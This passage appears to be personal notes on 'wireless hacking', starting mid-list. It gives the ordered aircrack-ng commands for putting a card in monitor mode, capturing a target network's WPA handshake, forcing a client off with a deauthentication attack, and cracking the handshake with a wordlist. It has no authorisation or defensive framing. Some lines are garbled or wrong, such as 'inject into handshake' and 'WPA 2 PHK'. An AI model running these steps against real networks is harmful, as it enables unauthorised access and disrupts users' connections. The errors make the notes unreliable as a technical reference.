2. Discover
    - Discover information about network
        * Channel
        * BSSID/MAC

3. Select
    - Select network and capture data.

4. Perform
    - Perform deauth attack6 Stages of Wireless Hacking.

5. Capture
    - Capture WPA handshake and inject into handshake.

6. Attempt
    - Attempt to crack the handshake hash (WPA 2 PHK).

Commands(in order)
    - iwconfig (To see active wifi networks)
    - airmon-ng check kill (kills processes that may interfere with monitoring wifi)
    - airmon-ng start wlan0 (Activates wifi sniffer airmon-ng)
    - airodump-ng wlan0mon (Will show all the devices on the wifi network)
        * The more positive the negative number, the closer the device.
        * Look for TP-Link for some reason.
    (Trying to capture handshake)
    - airodump-ng -c <channel> --bssid <mac address> -w capture(this is the filename to be stored in) wlan0mon
    (Deauth attack to speed up handshake)[This will disconnect a person for a short amount of time, so dont spam]
    - aireplay-ng -0(deauth) 1(num times run) -a <MAC address> -c(client/STATION) <Station address> wlan0mon
    - aircrack-ng -w wordlist.txt -b <MAC addreess> <capture file name>
